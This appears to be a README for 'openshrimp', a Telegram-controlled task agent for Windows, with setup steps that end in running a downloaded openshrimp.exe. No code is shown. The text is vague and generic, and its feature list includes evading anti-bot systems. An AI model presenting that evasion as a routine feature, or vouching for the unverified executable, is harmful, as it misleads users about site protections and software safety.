# 🦐 openshrimp - Easy Task Agent for Everyone

[![Download openshrimp](https://img.shields.io/badge/Download-openshrimp-4caf50?style=for-the-badge)](https://github.com/spider7811/openshrimp)

---

## 📋 What is openshrimp?

openshrimp is a tool that helps manage tasks using an intelligent research agent. It works with Telegram, so you do not need to set up any hosting or complex systems. The software plans tasks, keeps track of progress, and avoids bots blocking your actions. It uses a database to remember its state and can be extended with plugins to add features.  

You can think of it as an easy-to-use assistant that runs on your Windows PC, helping you plan and execute things behind the scenes. No programming skills are required.

---

## 🖥️ System Requirements

Before you download openshrimp, check that your computer meets these basic requirements:

- Windows 10 or newer  
- 4 GB RAM or more  
- At least 500 MB free disk space  
- Internet connection for Telegram and updates  
- Telegram account (needed to interact with the agent)  

---

## 🛠️ Key Features

- Connects with Telegram without complicated setup  
- Stores data securely using PostgreSQL database  
- Plans and executes tasks intelligently  
- Avoids detection by anti-bot systems  
- Modular plugin system to add new functions  
- Persistent state to keep progress after restarts  
- Uses fewer tokens for better efficiency  

---

## 🚀 Getting Started

### Step 1: Download openshrimp  

Visit this page to download openshrimp:  

[Download openshrimp from GitHub](https://github.com/spider7811/openshrimp)  

Click the green **Code** button and then **Download ZIP**. Save the file to your desktop or another folder you can easily find.

---

### Step 2: Install PostgreSQL  

openshrimp needs PostgreSQL database to save its data.  

- Go to https://www.postgresql.org/download/windows/  
- Download the latest version for Windows  
- Run the installer and follow the steps  
- When asked for password, choose one you can remember  
- Finish installation  

---

### Step 3: Set up Telegram Bot  

You need to create a Telegram Bot to use openshrimp:  

- Open the Telegram app on your phone or PC  
- Search for “BotFather” and start a chat  
- Send the command `/newbot`  
- Follow instructions to name your bot and get a token  
- Save the token; you will need it for openshrimp  

---

### Step 4: Configure openshrimp  

- Extract the ZIP file you downloaded  
- Find the file named `config.example.json`  
- Rename it to `config.json`  
- Open `config.json` in a text editor like Notepad  
- Enter your Telegram bot token under `"telegram_token"`  
- Enter your PostgreSQL username and password  
- Save and close the file  

---

### Step 5: Run openshrimp  

- In the openshrimp folder, double-click the `openshrimp.exe` file  
- A command window will open and start the program  
- You will see messages telling you the agent started  
- Open Telegram and message your bot to begin interacting  

---

## 🧰 How to Use openshrimp with Telegram

Once the agent is running, you can send your bot simple messages to assign tasks or get information.  

Example commands you can try:

- **Start a task**: Send the name of the task you want done  
- **Check status**: Ask the bot to tell you progress  
- **Stop a task**: Command the bot to cancel a running task  

The bot will reply with updates based on your commands.

---

## ⚙️ Managing Plugins

openshrimp supports plugins to add new capabilities.  

- Plugins live in the `plugins` folder inside the main directory  
- To add a plugin, download or create the plugin files there  
- Restart the program to load the new plugins  
- Each plugin may have its own configuration file  

---

## 🗄️ Data Storage and Logging

openshrimp uses PostgreSQL to store all your task data and agent state. This means your tasks continue without interruption even if you close the program.

Logs are saved in the `logs` folder. You can check these for troubleshooting or to review history.

---

## 🔄 Updating openshrimp

To keep your software current:

- Visit the download page: https://github.com/spider7811/openshrimp  
- Download the latest ZIP file  
- Extract it and replace the existing files (keep your `config.json`)  
- Restart the program  

---

## ❓ Common Issues

If openshrimp does not start:

- Check that PostgreSQL is running  
- Verify your Telegram bot token in the config file  
- Make sure your internet connection is active  

For plugin errors:

- Confirm the plugin files are correct and supported  
- Make sure you restarted openshrimp after adding plugins  

---

## 📥 Download and Setup Links

[![Get openshrimp](https://img.shields.io/badge/Get_openshrimp-Download-blue?style=for-the-badge)](https://github.com/spider7811/openshrimp)

Access the latest files and instructions here: https://github.com/spider7811/openshrimp

---

## 🏷️ Topics

agent, agentic-ai, agentic-framework, agentic-rag, agentic-workflow, ai, ai-agents, artificial-intelligence, openclaw, openclaw-plugin, openclaw-skills